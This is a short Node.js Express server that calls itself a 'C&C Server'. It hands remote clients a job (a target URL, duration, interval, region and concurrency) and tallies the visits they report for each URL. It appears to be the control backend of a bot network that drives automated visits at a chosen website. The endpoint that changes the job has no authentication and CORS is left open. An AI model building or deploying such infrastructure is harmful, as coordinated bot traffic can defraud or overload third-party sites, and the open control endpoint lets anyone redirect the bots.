const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000; // Render assigns its own PORT

const CONFIG_FILE = path.join(__dirname, 'config.json');

app.use(cors());
app.use(express.json());

// ---------------------------
//      API ROUTES FIRST
// ---------------------------

let currentJob = {
    targetUrl: 'https://example.com',
    duration: 30000,
    interval: 5000,
    region: null,
    concurrency: 5
};

// Load saved config (if exists)
if (fs.existsSync(CONFIG_FILE)) {
    try {
        const savedConfig = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
        currentJob = { ...currentJob, ...savedConfig };
        console.log('[*] Loaded config:', currentJob);
    } catch (err) {
        console.error('Failed to load config:', err.message);
    }
}

let stats = {
    totalVisits: 0,
    visitsByUrl: {}
};

// --- API: Get current job ---
app.get('/api/job', (req, res) => {
    res.json(currentJob);
});

// --- API: Update job ---
app.post('/api/job', (req, res) => {
    const { targetUrl, duration, interval, region, concurrency } = req.body;
    
    currentJob = {
        targetUrl,
        duration: parseInt(duration) || 60000,
        interval: parseInt(interval) || 5000,
        region: region || null,
        concurrency: parseInt(concurrency) || 5
    };

    fs.writeFileSync(CONFIG_FILE, JSON.stringify(currentJob, null, 2));
    res.json({ success: true, job: currentJob });
});

// --- API: Report visit ---
app.post('/api/report-visit', (req, res) => {
    const { url } = req.body;

    if (url) {
        stats.totalVisits++;
        stats.visitsByUrl[url] = (stats.visitsByUrl[url] || 0) + 1;
        res.json({ success: true });
        console.log(`[+] Visit reported for ${url}. Total: ${stats.totalVisits}`);
    } else {
        res.status(400).json({ error: 'URL is required' });
    }
});

// --- API: Get stats ---
app.get('/api/stats', (req, res) => {
    res.json(stats);
});

// ---------------------------
//  STATIC FILES (SAME FOLDER)
// ---------------------------
app.use(express.static(__dirname));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ---------------------------
app.listen(PORT, () => {
    console.log(`[+] C&C Server running on http://localhost:${PORT}`);
});
